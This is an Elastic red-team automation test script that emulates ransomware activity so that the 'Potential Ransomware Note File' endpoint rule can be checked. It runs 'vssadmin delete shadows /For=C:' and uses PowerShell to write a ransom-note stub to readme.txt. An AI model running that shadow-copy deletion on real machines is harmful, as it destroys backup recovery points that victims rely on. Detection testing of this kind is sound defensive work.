# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
# or more contributor license agreements. Licensed under the Elastic License
# 2.0; you may not use this file except in compliance with the Elastic License
# 2.0.

from . import _common
from . import RtaMetadata


metadata = RtaMetadata(
    id="2ab87570-d9ad-40f4-9f52-d5a2942e11ac",
    platforms=["windows"],
    endpoint_rules=[RuleMetadata(id="5dba1130-72df-46f1-b581-18d9c866cb23", name="Potential Ransomware Note File")],
    siem_rules=[],
    techniques=["T1485"],
)


@_common.requires_os(*metadata.platforms)
def main():
    vssadmin = "C:\\Windows\\System32\\vssadmin.exe"
    powershell = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"

    # Execute command
    _common.log("Deleting Shadow Copies and writing ransom note")
    _common.execute([vssadmin, "delete", "shadows", "/For=C:"], timeout=10)

    _common.execute([powershell, "/c", "echo 'Ooops! All your' > readme.txt"], timeout=10)


if __name__ == "__main__":
    exit(main())
